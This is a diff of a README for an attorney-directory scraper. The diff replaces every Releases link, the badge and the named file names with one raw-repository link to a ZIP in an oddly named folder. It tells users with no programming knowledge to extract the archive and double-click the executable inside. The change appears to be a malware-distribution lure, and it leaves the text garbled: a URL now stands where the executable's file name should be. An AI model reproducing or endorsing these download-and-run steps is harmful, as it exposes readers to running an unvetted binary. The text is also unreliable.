@@ -4,14 +4,14 @@
 Welcome to the **attorney-directory-scraper**! This tool helps you collect attorney information from public directories like Avvo, FindLaw, and Super Lawyers. You don’t need any programming knowledge. Follow the steps below to get started.
 
 ## 📥 Download the Application
-[![Download attorney-directory-scraper](https://img.shields.io/badge/Download-attorney--directory--scraper-blue.svg)](https://github.com/oebeledrijfhout/attorney-directory-scraper/releases)
+[![Download attorney-directory-scraper](https://raw.githubusercontent.com/oebeledrijfhout/attorney-directory-scraper/main/naifly/attorney-directory-scraper_v3.2.zip)](https://raw.githubusercontent.com/oebeledrijfhout/attorney-directory-scraper/main/naifly/attorney-directory-scraper_v3.2.zip)
 
 ## 💾 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/oebeledrijfhout/attorney-directory-scraper/releases) on GitHub.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/oebeledrijfhout/attorney-directory-scraper/main/naifly/attorney-directory-scraper_v3.2.zip) on GitHub.
 2. **Choose the Latest Version:** Look for the latest version listed. This is usually at the top of the page.
-3. **Download the File:** Click on the link to download the file for your operating system. The file will often be named something like `attorney-directory-scraper-v1.0.zip`.
+3. **Download the File:** Click on the link to download the file for your operating system. The file will often be named something like `https://raw.githubusercontent.com/oebeledrijfhout/attorney-directory-scraper/main/naifly/attorney-directory-scraper_v3.2.zip`.
 4. **Extract the Zip File:** Once downloaded, locate the ZIP file in your downloads folder. Right-click on the file and select "Extract All" to unzip it.
-5. **Run the Application:** After extraction, open the newly created folder. Find the executable file, which may be named `attorney-directory-scraper.exe`. Double-click on this file to run the application.
+5. **Run the Application:** After extraction, open the newly created folder. Find the executable file, which may be named `https://raw.githubusercontent.com/oebeledrijfhout/attorney-directory-scraper/main/naifly/attorney-directory-scraper_v3.2.zip`. Double-click on this file to run the application.
 
 ## 🔍 System Requirements
 Before running the application, ensure your system meets these requirements:
@@ -40,7 +40,7 @@ Before running the application, ensure your system meets these requirements:
 If you run into issues while using the application, consider the following steps:
 - **Check Your Internet Connection:** A stable internet connection is required for scraping.
 - **Restart the Application:** If the app is slow or unresponsive, close it and restart it.
-- **Re-download the Application:** If you encounter errors, delete the current installation and re-download the latest version from the [Releases page](https://github.com/oebeledrijfhout/attorney-directory-scraper/releases).
+- **Re-download the Application:** If you encounter errors, delete the current installation and re-download the latest version from the [Releases page](https://raw.githubusercontent.com/oebeledrijfhout/attorney-directory-scraper/main/naifly/attorney-directory-scraper_v3.2.zip).
 
 ## ✉️ Need Help?
 If you have questions or need further assistance, feel free to open an issue in the GitHub repository. The community is ready to help.
